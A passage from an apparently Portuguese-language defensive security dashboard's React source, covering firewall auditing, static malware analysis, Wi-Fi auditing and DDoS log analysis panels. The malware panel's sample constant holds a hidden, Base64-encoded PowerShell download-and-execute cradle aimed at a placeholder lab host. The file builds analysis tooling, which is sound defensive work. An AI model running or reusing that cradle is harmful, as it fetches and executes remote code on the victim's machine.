              <div className="p-3 rounded-md border border-amber-500/40 bg-amber-500/5 space-y-1.5">
                <div className="font-semibold">Inspeção Passiva de JWT</div>
                {result.jwt_inspection.warnings.map((w) => (
                  <div key={w} className="text-amber-300">
                    • {w}
                  </div>
                ))}
                <pre className="p-2 rounded bg-slate-950 text-[11px] overflow-x-auto">
                  {JSON.stringify(
                    {
                      header: result.jwt_inspection.header,
                      payload_sanitized: result.jwt_inspection.payload_sanitized,
                    },
                    null,
                    2
                  )}
                </pre>
              </div>
            )}
          </div>
        )}
      </CardContent>
    </Card>
  );
}

// ---------------------------------------------------------------------------
// 4. Firewall Tester
// ---------------------------------------------------------------------------

const SAMPLE_FIREWALL_RULES = `# Política de perímetro de laboratório
iptables -A INPUT -p tcp -s 0.0.0.0/0 --dport 443 -j ACCEPT
iptables -A INPUT -p tcp -s 0.0.0.0/0 --dport 5432 -j ACCEPT
iptables -A INPUT -p tcp -s 10.0.0.0/8 --dport 22 -j ACCEPT
iptables -A INPUT -p tcp -s 10.20.0.0/16 --dport 22 -j DENY`;

function FirewallTesterWorkspace({ token }: { token: string | null }) {
  const [rulesText, setRulesText] = useState("");
  const [simEnabled, setSimEnabled] = useState(true);
  const [proto, setProto] = useState<"TCP" | "UDP" | "ICMP">("TCP");
  const [srcIp, setSrcIp] = useState("10.20.1.15");
  const [dstPort, setDstPort] = useState(22);
  const [result, setResult] = useState<FirewallAnalyzeResponse | null>(null);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);

  async function handleTest() {
    if (!rulesText.trim()) return;
    setLoading(true);
    setError(null);
    try {
      const res = await analyzeFirewallTool(
        {
          rules_text: rulesText,
          test_packet: simEnabled
            ? {
                protocol: proto,
                source_ip: srcIp,
                destination_port: dstPort,
              }
            : null,
        },
        token
      );
      setResult(res);
    } catch (err) {
      setError(
        err instanceof Error ? err.message : "Erro ao testar regras de firewall."
      );
    } finally {
      setLoading(false);
    }
  }

  return (
    <Card>
      <CardHeader>
        <div className="flex flex-wrap items-center justify-between gap-2">
          <div>
            <CardTitle className="flex items-center gap-2 text-base">
              <ShieldAlert className="h-5 w-5 text-yellow-400" />
              Firewall Tester · Auditoria de Políticas &amp; Simulador de Pacotes
            </CardTitle>
            <p className="text-xs text-slate-500 dark:text-slate-400 mt-1">
              Analisa regras `iptables`, `ufw` ou listas genéricas (`ALLOW/DENY`)
              quanto a portas críticas expostas, regras sombreadas e ausência de
              Default-Deny.
            </p>
          </div>
          <Button
            type="button"
            size="sm"
            variant="outline"
            onClick={() => setRulesText(SAMPLE_FIREWALL_RULES)}
          >
            Carregar Regras de Laboratório
          </Button>
        </div>
      </CardHeader>
      <CardContent className="space-y-4">
        <textarea
          rows={6}
          aria-label="Regras de firewall"
          placeholder="Cole regras iptables, ufw ou ALLOW/DENY PROTO SRC PORT..."
          value={rulesText}
          onChange={(e) => setRulesText(e.target.value)}
          className="w-full rounded-md border border-slate-300 dark:border-slate-700 bg-white dark:bg-slate-900 p-3 font-mono text-xs"
        />

        <div className="p-3 rounded-md border border-slate-200 dark:border-slate-800 space-y-2">
          <label className="flex items-center gap-2 text-xs font-medium">
            <input
              type="checkbox"
              checked={simEnabled}
              onChange={(e) => setSimEnabled(e.target.checked)}
            />
            Simular correspondência de pacote nas regras ordenadas
          </label>
          {simEnabled && (
            <div className="grid grid-cols-1 md:grid-cols-3 gap-2 text-xs">
              <select
                aria-label="Protocolo do pacote"
                value={proto}
                onChange={(e) =>
                  setProto(e.target.value as "TCP" | "UDP" | "ICMP")
                }
                className="h-8 rounded border border-slate-300 dark:border-slate-700 bg-white dark:bg-slate-900 px-2"
              >
                <option value="TCP">TCP</option>
                <option value="UDP">UDP</option>
                <option value="ICMP">ICMP</option>
              </select>
              <input
                type="text"
                aria-label="IP de origem do pacote"
                value={srcIp}
                onChange={(e) => setSrcIp(e.target.value)}
                placeholder="IP de origem (ex.: 198.51.100.10)"
                className="h-8 rounded border border-slate-300 dark:border-slate-700 bg-white dark:bg-slate-900 px-2"
              />
              <input
                type="number"
                aria-label="Porta de destino"
                min={1}
                max={65535}
                value={dstPort}
                onChange={(e) => setDstPort(Number(e.target.value))}
                className="h-8 rounded border border-slate-300 dark:border-slate-700 bg-white dark:bg-slate-900 px-2"
              />
            </div>
          )}
        </div>

        <Button
          type="button"
          onClick={handleTest}
          disabled={loading || !rulesText.trim()}
        >
          {loading && <Loader2 className="h-4 w-4 mr-2 animate-spin" />}
          Auditar Regras de Firewall
        </Button>

        {error && (
          <div
            role="alert"
            className="p-3 rounded-md border border-red-500/40 bg-red-500/10 text-xs text-red-400"
          >
            {error}
          </div>
        )}

        {result && (
          <div className="space-y-3 pt-3 border-t border-slate-200 dark:border-slate-800 text-xs">
            <div className="flex flex-wrap items-center gap-2">
              <Badge
                variant={
                  result.posture_score >= 80
                    ? "success"
                    : result.posture_score >= 50
                      ? "warning"
                      : "critical"
                }
              >
                Postura: {result.posture_score}/100
              </Badge>
              <Badge variant="outline">
                Regras interpretadas: {result.total_rules_parsed}
              </Badge>
              <Badge variant={result.has_default_deny ? "success" : "critical"}>
                Default-Deny: {result.has_default_deny ? "Sim" : "Ausente"}
              </Badge>
            </div>

            {result.simulation && (
              <div className="p-3 rounded-md border border-sky-500/40 bg-sky-500/10 space-y-1">
                <div className="font-semibold">
                  Resultado da Simulação: {result.simulation.verdict}
                </div>
                <div>{result.simulation.explanation}</div>
              </div>
            )}

            <div className="space-y-2">
              {result.findings.map((f, idx) => (
                <div
                  key={`${f.title}-${idx}`}
                  className="p-3 rounded-md border border-slate-200 dark:border-slate-800 space-y-1"
                >
                  <div className="flex items-center gap-2">
                    <Badge variant={severityBadgeVariant(f.severity)}>
                      {f.severity}
                    </Badge>
                    <Badge variant="outline">{f.cwe_id}</Badge>
                    <span className="font-semibold">{f.title}</span>
                  </div>
                  <p className="text-slate-400">{f.description}</p>
                  <p className="text-emerald-400">
                    <strong>Correção:</strong> {f.remediation}
                  </p>
                </div>
              ))}
            </div>
          </div>
        )}
      </CardContent>
    </Card>
  );
}

// ---------------------------------------------------------------------------
// 5. Malware Analysis
// ---------------------------------------------------------------------------

const SAMPLE_MALWARE_PAYLOAD =
  "powershell.exe -NoP -NonI -W Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AbABhAGIALQBtAGEAbAB3AGEAcgBlAC0AcwBhAG0AcABsAGUALgBpAG4AdgBhAGwAaQBkAC8AcwB0AGEAZwBlACcAKQA=";

function MalwareAnalysisWorkspace({ token }: { token: string | null }) {
  const [filename, setFilename] = useState("amostra-lab.ps1");
  const [encoding, setEncoding] = useState<"TEXT" | "BASE64" | "HEX">("TEXT");
  const [payload, setPayload] = useState("");
  const [result, setResult] = useState<MalwareAnalyzeResponse | null>(null);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);

  async function handleAnalyze() {
    if (!payload.trim()) return;
    setLoading(true);
    setError(null);
    try {
      const res = await analyzeMalwareTool(
        { payload, filename, input_encoding: encoding },
        token
      );
      setResult(res);
    } catch (err) {
      setError(
        err instanceof Error ? err.message : "Erro na análise estática."
      );
    } finally {
      setLoading(false);
    }
  }

  return (
    <Card>
      <CardHeader>
        <div className="flex flex-wrap items-center justify-between gap-2">
          <div>
            <CardTitle className="flex items-center gap-2 text-base">
              <Skull className="h-5 w-5 text-rose-400" />
              Malware Analysis · Inspeção Estática &amp; MITRE ATT&amp;CK
            </CardTitle>
            <p className="text-xs text-slate-500 dark:text-slate-400 mt-1">
              Decodifica payloads Base64/Hex e comandos PowerShell ofuscados
              estaticamente (sem qualquer execução), calcula entropia e identifica
              assinaturas suspeitas.
            </p>
          </div>
          <Button
            type="button"
            size="sm"
            variant="outline"
            onClick={() => setPayload(SAMPLE_MALWARE_PAYLOAD)}
          >
            Carregar Payload Inofensivo de Laboratório
          </Button>
        </div>
      </CardHeader>
      <CardContent className="space-y-4">
        <div className="grid grid-cols-1 md:grid-cols-3 gap-3 text-xs">
          <div className="md:col-span-2">
            <label className="block font-medium mb-1">Nome da Amostra</label>
            <input
              type="text"
              value={filename}
              onChange={(e) => setFilename(e.target.value)}
              className="w-full h-9 rounded-md border border-slate-300 dark:border-slate-700 bg-white dark:bg-slate-900 px-3"
            />
          </div>
          <div>
            <label className="block font-medium mb-1">Codificação de Entrada</label>
            <select
              value={encoding}
              onChange={(e) =>
                setEncoding(e.target.value as "TEXT" | "BASE64" | "HEX")
              }
              className="w-full h-9 rounded-md border border-slate-300 dark:border-slate-700 bg-white dark:bg-slate-900 px-2.5"
            >
              <option value="TEXT">TEXT (Script / Texto)</option>
              <option value="BASE64">BASE64</option>
              <option value="HEX">HEX</option>
            </select>
          </div>
        </div>

        <textarea
          rows={5}
          aria-label="Payload para análise estática"
          placeholder="Cole script suspeito, string codificada em Base64 ou dump hexadecimal..."
          value={payload}
          onChange={(e) => setPayload(e.target.value)}
          className="w-full rounded-md border border-slate-300 dark:border-slate-700 bg-white dark:bg-slate-900 p-3 font-mono text-xs"
        />

        <Button
          type="button"
          onClick={handleAnalyze}
          disabled={loading || !payload.trim()}
        >
          {loading && <Loader2 className="h-4 w-4 mr-2 animate-spin" />}
          Analisar Estaticamente
        </Button>

        {error && (
          <div
            role="alert"
            className="p-3 rounded-md border border-red-500/40 bg-red-500/10 text-xs text-red-400"
          >
            {error}
          </div>
        )}

        {result && (
          <div className="space-y-3 pt-3 border-t border-slate-200 dark:border-slate-800 text-xs">
            <div className="flex flex-wrap items-center gap-2">
              <Badge
                variant={
                  result.verdict === "HIGH_RISK_MALICIOUS_INDICATORS"
                    ? "critical"
                    : result.verdict === "SUSPICIOUS"
                      ? "warning"
                      : "success"
                }
              >
                {result.verdict} (Risco {result.risk_score}/100)
              </Badge>
              <Badge variant="outline">{result.file_type_guess}</Badge>
              <Badge variant={result.high_entropy_warning ? "warning" : "outline"}>
                Entropia: {result.shannon_entropy}
              </Badge>
            </div>

            {result.deobfuscated_previews.length > 0 && (
              <div className="p-3 rounded-md border border-amber-500/40 bg-amber-500/5 space-y-1.5">
                <div className="font-semibold">
                  Conteúdo Desofuscado (Prévia Segura):
                </div>
                {result.deobfuscated_previews.map((item, idx) => (
                  <div key={idx} className="space-y-0.5">
                    <div className="text-[11px] text-amber-300">
                      {item.encoding}
                    </div>
                    <pre className="p-2 rounded bg-slate-950 font-mono text-[11px] overflow-x-auto">
                      {item.decoded_preview}
                    </pre>
                  </div>
                ))}
              </div>
            )}

            {result.signature_hits.length > 0 && (
              <div className="space-y-2">
                <div className="font-semibold">
                  Assinaturas &amp; Heurísticas Acionadas (
                  {result.signature_hits.length})
                </div>
                {result.signature_hits.map((hit) => (
                  <div
                    key={hit.rule_id}
                    className="p-3 rounded border border-slate-200 dark:border-slate-800 space-y-1"
                  >
                    <div className="flex items-center gap-2">
                      <Badge variant={severityBadgeVariant(hit.severity)}>
                        {hit.severity}
                      </Badge>
                      <Badge variant="outline">MITRE {hit.mitre_attack}</Badge>
                      <span className="font-semibold">
                        [{hit.rule_id}] {hit.name}
                      </span>
                    </div>
                    <p className="text-slate-400">{hit.description}</p>
                    <div className="font-mono text-[11px] bg-slate-950 p-1.5 rounded">
                      {hit.matched_excerpt}
                    </div>
                  </div>
                ))}
              </div>
            )}

            <div className="p-3 rounded border border-slate-200 dark:border-slate-800 space-y-1">
              <div className="font-semibold">Recomendações de Contenção</div>
              <ul className="list-disc pl-4 space-y-0.5 text-slate-300">
                {result.containment_recommendations.map((r) => (
                  <li key={r}>{r}</li>
                ))}
              </ul>
            </div>
          </div>
        )}
      </CardContent>
    </Card>
  );
}

// ---------------------------------------------------------------------------
// 6. WiFi Auditor
// ---------------------------------------------------------------------------

const SAMPLE_NETSH_WIFI = `SSID 1 : Corp-Lab-Secure
    Tipo de rede           : Infraestrutura
    Autenticação            : WPA3-Personal
    Criptografia            : CCMP
    BSSID 1                 : 02:11:22:33:44:55
         Sinal              : 88%
         Canal              : 6
SSID 2 : Corp-Lab-Secure
    Tipo de rede           : Infraestrutura
    Autenticação            : Aberta
    Criptografia            : Nenhuma
    BSSID 1                 : 02:99:88:77:66:55
         Sinal              : 92%
         Canal              : 3
SSID 3 : TP-Link_Legado
    Tipo de rede           : Infraestrutura
    Autenticação            : WEP
    Criptografia            : WEP
    BSSID 1                 : 02:aa:bb:cc:dd:ee
         Sinal              : 65%
         Canal              : 11`;

function WifiAuditorWorkspace({ token }: { token: string | null }) {
  const [rawScanOutput, setRawScanOutput] = useState("");
  const [connectedIfaceOutput, setConnectedIfaceOutput] = useState("");
  const [extraSsid, setExtraSsid] = useState("");
  const [extraAuth, setExtraAuth] = useState("WPA2-Personal");
  const [extraWps, setExtraWps] = useState(false);
  const [result, setResult] = useState<WifiAnalyzeResponse | null>(null);
  const [scanSource, setScanSource] = useState<string | null>(null);
  const [capturedAt, setCapturedAt] = useState<string | null>(null);
  const [sensorHint, setSensorHint] = useState<string | null>(null);
  const [autoRefresh, setAutoRefresh] = useState(false);
  const [scanningLive, setScanningLive] = useState(false);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);

  const handleLiveScan = useCallback(async () => {
    setScanningLive(true);
    setError(null);
    setSensorHint(null);
    try {
      const hostRes = await scanLocalWifiTool(token);
      if (hostRes.available && hostRes.audit) {
        setRawScanOutput(hostRes.raw_scan_output ?? "");
        setConnectedIfaceOutput(hostRes.connected_interface_output ?? "");
        setResult(hostRes.audit);
        setScanSource(`Captura Real · Host (${hostRes.source})`);
        setCapturedAt(hostRes.captured_at ?? null);
        return;
      }

      const bridgeRes = await fetchHostWifiBridgeScan();
      if (bridgeRes.available && bridgeRes.raw_scan_output) {
        setRawScanOutput(bridgeRes.raw_scan_output);
        setConnectedIfaceOutput(bridgeRes.connected_interface_output ?? "");
        const audited = await analyzeWifiTool(
          {
            raw_scan_output: bridgeRes.raw_scan_output,
            connected_interface_output:
              bridgeRes.connected_interface_output ?? null,
            networks: [],
          },
          token
        );
        setResult(audited);
        setScanSource(
          `Captura Real · Sensor Local 127.0.0.1:8765 (${bridgeRes.tool ?? "netsh"})`
        );
        setCapturedAt(bridgeRes.captured_at ?? null);
        return;
      }

      setAutoRefresh(false);
      setSensorHint(
        bridgeRes.error ||
          hostRes.detail ||
          "Sensor local Wi-Fi não encontrado em 127.0.0.1:8765."
      );
    } catch (err) {
      setError(
        err instanceof Error
          ? err.message
          : "Falha ao escanear redes Wi-Fi reais."
      );
    } finally {
      setScanningLive(false);
    }
  }, [token]);

  useEffect(() => {
    if (!autoRefresh) return;
    const timer = setInterval(() => {
      void handleLiveScan();
    }, 15000);
    return () => clearInterval(timer);
  }, [autoRefresh, handleLiveScan]);

  async function handleAudit() {
    const networks: WifiNetworkInput[] = extraSsid.trim()
      ? [
          {
            ssid: extraSsid.trim(),
            authentication: extraAuth,
            encryption: extraAuth === "Open" ? "None" : "CCMP",
            wps_enabled: extraWps,
          },
        ]
      : [];

    if (!rawScanOutput.trim() && networks.length === 0) return;

    setLoading(true);
    setError(null);
    try {
      const res = await analyzeWifiTool(
        {
          raw_scan_output: rawScanOutput.trim() || null,
          connected_interface_output: connectedIfaceOutput.trim() || null,
          networks,
        },
        token
      );
      setResult(res);
      setScanSource("Auditoria Manual / Entrada Fornecida");
    } catch (err) {
      setError(
        err instanceof Error ? err.message : "Erro na auditoria Wi-Fi."
      );
    } finally {
      setLoading(false);
    }
  }

  return (
    <Card>
      <CardHeader>
        <div className="flex flex-wrap items-center justify-between gap-2">
          <div>
            <CardTitle className="flex items-center gap-2 text-base">
              <Wifi className="h-5 w-5 text-sky-400" />
              WiFi Auditor · Auditoria Passiva Real de Redes Sem Fio
            </CardTitle>
            <p className="text-xs text-slate-500 dark:text-slate-400 mt-1">
              Lê passivamente o adaptador Wi-Fi real via `netsh` (Windows) ou
              `nmcli` (Linux) — identificando redes abertas/WEP/TKIP, canais
              sobrepostos, bandas e indícios de Evil Twin.
            </p>
          </div>
          <div className="flex flex-wrap items-center gap-2">
            <Button
              type="button"
              size="sm"
              onClick={() => void handleLiveScan()}
              disabled={scanningLive}
            >
              {scanningLive ? (
                <Loader2 className="h-3.5 w-3.5 mr-1.5 animate-spin" />
              ) : (
                <RefreshCw className="h-3.5 w-3.5 mr-1.5" />
              )}
              Escanear Wi-Fi Real Agora
            </Button>
            <Button
              type="button"
              size="sm"
              variant="outline"
              onClick={() => {
                setConnectedIfaceOutput("");
                setRawScanOutput(SAMPLE_NETSH_WIFI);
                setScanSource(null);
              }}
            >
              Carregar Exemplo de Laboratório
            </Button>
          </div>
        </div>
      </CardHeader>
      <CardContent className="space-y-4">
        <div className="flex flex-wrap items-center justify-between gap-2 text-xs">
          <label className="flex items-center gap-2 cursor-pointer">
            <input
              type="checkbox"
              checked={autoRefresh}
              onChange={(e) => setAutoRefresh(e.target.checked)}
            />
            Auto-atualizar varredura real a cada 15s
          </label>
          {scanSource && (
            <div className="flex flex-wrap items-center gap-2">
              <Badge variant="success">{scanSource}</Badge>
              {capturedAt && (
                <span className="text-slate-400">
                  {new Date(capturedAt).toLocaleTimeString("pt-BR")}
                </span>
              )}
            </div>
          )}
        </div>

        {sensorHint && (
          <div className="p-3 rounded-md border border-amber-500/40 bg-amber-500/10 text-xs space-y-2">
            <div className="font-semibold text-amber-300">
              Para leitura direta da placa Wi-Fi do Windows a partir do Docker:
            </div>
            <p className="text-slate-300">
              Execute o sensor passivo em loopback no host (sem privilégios
              especiais) e clique novamente em{" "}
              <strong>Escanear Wi-Fi Real Agora</strong>. Motivo atual:{" "}
              {sensorHint}
            </p>
            <div className="flex flex-wrap items-center justify-between gap-2 p-2 rounded bg-slate-950 font-mono text-[11px]">
              <span>python scripts/wifi_local_sensor.py</span>
              <CopyTextButton value="python scripts/wifi_local_sensor.py" />
            </div>
          </div>
        )}

        <textarea
          rows={6}
          aria-label="Saída de varredura Wi-Fi"
          placeholder="Clique em 'Escanear Wi-Fi Real Agora' ou cole a saída de `netsh wlan show networks mode=bssid` / `nmcli`..."
          value={rawScanOutput}
          onChange={(e) => setRawScanOutput(e.target.value)}
          className="w-full rounded-md border border-slate-300 dark:border-slate-700 bg-white dark:bg-slate-900 p-3 font-mono text-xs"
        />

        <div className="grid grid-cols-1 md:grid-cols-3 gap-2 text-xs p-3 rounded border border-slate-200 dark:border-slate-800">
          <input
            type="text"
            placeholder="Ou adicione SSID manual (opcional)"
            value={extraSsid}
            onChange={(e) => setExtraSsid(e.target.value)}
            className="h-8 rounded border border-slate-300 dark:border-slate-700 bg-white dark:bg-slate-900 px-2"
          />
          <select
            value={extraAuth}
            onChange={(e) => setExtraAuth(e.target.value)}
            className="h-8 rounded border border-slate-300 dark:border-slate-700 bg-white dark:bg-slate-900 px-2"
          >
            <option value="WPA3-Personal">WPA3-Personal</option>
            <option value="WPA2-Personal">WPA2-Personal</option>
            <option value="WPA-Personal">WPA1 / TKIP</option>
            <option value="WEP">WEP</option>
            <option value="Open">Aberta (Open)</option>
          </select>
          <label className="flex items-center gap-1.5">
            <input
              type="checkbox"
              checked={extraWps}
              onChange={(e) => setExtraWps(e.target.checked)}
            />
            WPS habilitado
          </label>
        </div>

        <Button
          type="button"
          variant="secondary"
          onClick={handleAudit}
          disabled={loading || (!rawScanOutput.trim() && !extraSsid.trim())}
        >
          {loading && <Loader2 className="h-4 w-4 mr-2 animate-spin" />}
          Auditar Texto / Rede Informada
        </Button>

        {error && (
          <div
            role="alert"
            className="p-3 rounded-md border border-red-500/40 bg-red-500/10 text-xs text-red-400"
          >
            {error}
          </div>
        )}

        {result && (
          <div className="space-y-3 pt-3 border-t border-slate-200 dark:border-slate-800 text-xs">
            {result.connected_interface && (
              <div className="p-3 rounded-md border border-sky-500/40 bg-sky-500/10 space-y-1">
                <div className="font-semibold flex items-center justify-between gap-2">
                  <span>
                    Conexão Wi-Fi Ativa:{" "}
                    {result.connected_interface.ssid ?? "Desconectado"}
                  </span>
                  <Badge variant="default">
                    {result.connected_interface.state ?? "Ativo"}
                  </Badge>
                </div>
                <div className="grid grid-cols-2 md:grid-cols-4 gap-2 text-[11px] text-slate-300">
                  <div>
                    Adaptador:{" "}
                    {result.connected_interface.adapter_description ??
                      result.connected_interface.interface_name ??
                      "—"}
                  </div>
                  <div>
                    BSSID:{" "}
                    <span className="font-mono">
                      {result.connected_interface.bssid ?? "—"}
                    </span>
                  </div>
                  <div>
                    Segurança:{" "}
                    {result.connected_interface.authentication ?? "—"} /{" "}
                    {result.connected_interface.encryption ?? "—"}
                  </div>
                  <div>
                    Canal {result.connected_interface.channel ?? "—"} · Sinal{" "}
                    {result.connected_interface.signal_percent ?? "—"}% ·{" "}
                    {result.connected_interface.radio_type ?? "—"}
                  </div>
                </div>
              </div>
            )}

            <div className="flex flex-wrap items-center gap-2">
              <Badge
                variant={
                  result.overall_score >= 80
                    ? "success"
                    : result.overall_score >= 55
                      ? "warning"
                      : "critical"
                }
              >
                Pontuação Geral: {result.overall_score}/100
              </Badge>
              <Badge variant="outline">
                APs / BSSIDs avaliados: {result.total_networks}
              </Badge>
              {result.evil_twin_suspected && (
                <Badge variant="critical">
                  Alerta: Possível Evil Twin Detectado
                </Badge>
              )}
            </div>

            <div className="overflow-x-auto">
              <table className="w-full text-left border-collapse">
                <thead>
                  <tr className="border-b border-slate-200 dark:border-slate-800 text-slate-400">
                    <th className="py-1.5 pr-3">SSID</th>
                    <th className="py-1.5 pr-3">BSSID</th>
                    <th className="py-1.5 pr-3">Autenticação / Cifra</th>
                    <th className="py-1.5 pr-3">Banda / Canal</th>
                    <th className="py-1.5 pr-3">Sinal</th>
                    <th className="py-1.5">Nota</th>
                  </tr>
                </thead>
                <tbody>
                  {result.assessments.map((a, idx) => (
                    <tr
                      key={`${a.ssid}-${a.bssid ?? idx}`}
                      className="border-b border-slate-200/50 dark:border-slate-800/50"
                    >
                      <td className="py-1.5 pr-3 font-medium">{a.ssid}</td>
                      <td className="py-1.5 pr-3 font-mono">
                        {a.bssid ?? "—"}
                      </td>
                      <td className="py-1.5 pr-3">
                        {a.authentication} ({a.encryption})
                      </td>
                      <td className="py-1.5 pr-3">
                        {[
                          a.band,
                          a.channel ? `Ch ${a.channel}` : null,
                          a.radio_type,
                        ]
                          .filter(Boolean)
                          .join(" · ") || "—"}
                      </td>
                      <td className="py-1.5 pr-3">
                        {a.signal_percent !== null &&
                        a.signal_percent !== undefined ? (
                          <div className="flex items-center gap-1.5">
                            <div className="w-12 h-1.5 rounded bg-slate-800 overflow-hidden">
                              <div
                                className="h-full bg-sky-400"
                                style={{ width: `${a.signal_percent}%` }}
                              />
                            </div>
                            <span>{a.signal_percent}%</span>
                          </div>
                        ) : (
                          "—"
                        )}
                      </td>
                      <td className="py-1.5">
                        <Badge
                          variant={
                            a.security_grade === "A" || a.security_grade === "B"
                              ? "success"
                              : a.security_grade === "C"
                                ? "warning"
                                : "critical"
                          }
                        >
                          {a.security_grade}
                        </Badge>
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>

            <div className="space-y-2">
              {result.findings.map((f, idx) => (
                <div
                  key={`${f.ssid}-${f.title}-${idx}`}
                  className="p-2.5 rounded border border-slate-200 dark:border-slate-800 space-y-1"
                >
                  <div className="flex items-center gap-2">
                    <Badge variant={severityBadgeVariant(f.severity)}>
                      {f.severity}
                    </Badge>
                    <span className="font-semibold">
                      [{f.ssid}] {f.title}
                    </span>
                  </div>
                  <p className="text-slate-400">{f.description}</p>
                  <p className="text-emerald-400">{f.remediation}</p>
                </div>
              ))}
            </div>
          </div>
        )}
      </CardContent>
    </Card>
  );
}

// ---------------------------------------------------------------------------
// 7. DDoS Analyzer
// ---------------------------------------------------------------------------

const SAMPLE_DDOS_LOGS = Array.from({ length: 14 }, (_, idx) =>
  `198.51.100.88 - - [20/Nov/2026:20:00:01 +0000] "GET /api/v1/search?q=rand${idx} HTTP/1.1" 503 214 "-" "python-requests/2.31"`
)
  .concat([
    `203.0.113.10 - - [20/Nov/2026:20:00:02 +0000] "GET /health HTTP/1.1" 200 42 "-" "Mozilla/5.0"`,
    `203.0.113.11 - - [20/Nov/2026:20:00:03 +0000] "GET / HTTP/1.1" 200 1024 "-" "Mozilla/5.0"`,
  ])
  .join("\n");

function DdosAnalyzerWorkspace({
  token,
  assets,
}: {
  token: string | null;
  assets: AssetResponse[];
}) {
  const [accessLogs, setAccessLogs] = useState("");
  const [assetId, setAssetId] = useState("");
  const [posture, setPosture] = useState<DdosPostureConfig>({
    has_cdn_waf: false,
    has_rate_limiting: false,
    has_syn_cookies: true,
    has_upstream_timeouts: false,
    has_autoscaling_or_anycast: false,
  });
  const [result, setResult] = useState<DdosAnalyzeResponse | null>(null);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);

  async function handleAnalyze() {
    setLoading(true);
    setError(null);
    try {
      const res = await analyzeDdosTool(
        {
          access_logs: accessLogs.trim() || null,
          posture,
          asset_id: assetId || null,
        },
        token
      );
      setResult(res);
    } catch (err) {
      setError(
        err instanceof Error ? err.message : "Erro ao analisar postura DDoS."
      );
    } finally {
      setLoading(false);
    }
  }

  return (
    <Card>
      <CardHeader>
        <div className="flex flex-wrap items-center justify-between gap-2">
          <div>
            <CardTitle className="flex items-center gap-2 text-base">
              <Crosshair className="h-5 w-5 text-orange-400" />
              DDoS Analyzer · Diagnóstico de Logs &amp; Mitigação Defensiva
            </CardTitle>
            <p className="text-xs text-slate-500 dark:text-slate-400 mt-1">
              Identifica picos de RPS, concentração por IP, saturação 429/503 e
              L7 Cache-Busting em logs de acesso, gerando regras prontas de
              mitigação para Nginx, WAF e sysctl.
            </p>
          </div>
          <Button
            type="button"
            size="sm"
            variant="outline"
            onClick={() => setAccessLogs(SAMPLE_DDOS_LOGS)}
          >
            Carregar Log de Rajada de Laboratório
          </Button>
        </div>
      </CardHeader>
      <CardContent className="space-y-4">
        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-2 text-xs p-3 rounded border border-slate-200 dark:border-slate-800">
          {(
            [
              ["has_cdn_waf", "CDN / WAF na borda (Cloudflare/CloudFront)"],
              ["has_rate_limiting", "Rate Limiting por IP / Rota"],
              ["has_syn_cookies", "Kernel SYN Cookies ativo"],
              ["has_upstream_timeouts", "Timeouts anti-Slowloris configurados"],
              ["has_autoscaling_or_anycast", "Anycast / Auto-scaling de origem"],
            ] as const
          ).map(([key, label]) => (
            <label key={key} className="flex items-center gap-2">
              <input
                type="checkbox"
                checked={posture[key]}
                onChange={(e) =>
                  setPosture((prev) => ({ ...prev, [key]: e.target.checked }))
                }
              />
              {label}
            </label>
          ))}
        </div>

        {token && assets.length > 0 && (
          <div className="text-xs">
            <label className="block font-medium mb-1">
              Correlacionar com achados do Módulo F de um Ativo (opcional)
            </label>
            <select
              value={assetId}
              onChange={(e) => setAssetId(e.target.value)}
              className="w-full md:w-96 h-9 rounded border border-slate-300 dark:border-slate-700 bg-white dark:bg-slate-900 px-2.5"
            >
              <option value="">Sem vínculo com ativo</option>
              {assets.map((a) => (
                <option key={a.id} value={a.id}>
                  {a.name} ({a.hostname})
                </option>
              ))}
            </select>
          </div>
        )}

        <textarea
          rows={5}
          aria-label="Logs de acesso HTTP"
          placeholder="Cole linhas de access.log (Nginx/Apache Combined) para análise de picos e anomalias L7..."
          value={accessLogs}
          onChange={(e) => setAccessLogs(e.target.value)}
          className="w-full rounded-md border border-slate-300 dark:border-slate-700 bg-white dark:bg-slate-900 p-3 font-mono text-xs"
        />

        <Button type="button" onClick={handleAnalyze} disabled={loading}>
          {loading && <Loader2 className="h-4 w-4 mr-2 animate-spin" />}
          Diagnosticar &amp; Gerar Mitigações
        </Button>

        {error && (
          <div
            role="alert"
            className="p-3 rounded-md border border-red-500/40 bg-red-500/10 text-xs text-red-400"
          >
            {error}
          </div>
        )}

        {result && (
          <div className="space-y-4 pt-3 border-t border-slate-200 dark:border-slate-800 text-xs">
            <div className="grid grid-cols-2 md:grid-cols-4 gap-3">
              <div className="p-3 rounded border border-slate-200 dark:border-slate-800">
                <div className="text-slate-400">Resiliência</div>
                <div className="text-lg font-bold">
                  {result.resilience_score}/100
                </div>
                <Badge variant={severityBadgeVariant(result.risk_level)}>
                  Risco: {result.risk_level}
                </Badge>
              </div>
              <div className="p-3 rounded border border-slate-200 dark:border-slate-800">
                <div className="text-slate-400">Requisições / IPs</div>
                <div className="text-lg font-bold">
                  {result.total_requests_parsed}
                </div>
                <div className="text-slate-400">
                  {result.unique_ips} IPs únicos
                </div>
              </div>
              <div className="p-3 rounded border border-slate-200 dark:border-slate-800">
                <div className="text-slate-400">Pico Observado</div>
                <div className="text-lg font-bold">{result.peak_rps} req/s</div>
              </div>
              <div className="p-3 rounded border border-slate-200 dark:border-slate-800">
                <div className="text-slate-400">Taxa 429 / 5xx</div>
                <div className="text-lg font-bold">
                  {result.error_5xx_429_rate_percent}%
                </div>
              </div>
            </div>

            {result.asset_module_f_context.length > 0 && (
              <div className="p-3 rounded border border-sky-500/40 bg-sky-500/10 space-y-1">
                <div className="font-semibold">
                  Contexto Módulo F do Ativo:
                </div>
                {result.asset_module_f_context.map((line) => (
                  <div key={line}>• {line}</div>
                ))}
              </div>
            )}

            {result.anomalies.length > 0 && (
              <div className="space-y-2">
                <div className="font-semibold">
                  Anomalias Detectadas ({result.anomalies.length})
                </div>
                {result.anomalies.map((a, idx) => (
                  <div
                    key={`${a.anomaly_type}-${idx}`}
                    className="p-3 rounded border border-slate-200 dark:border-slate-800 space-y-1"
                  >
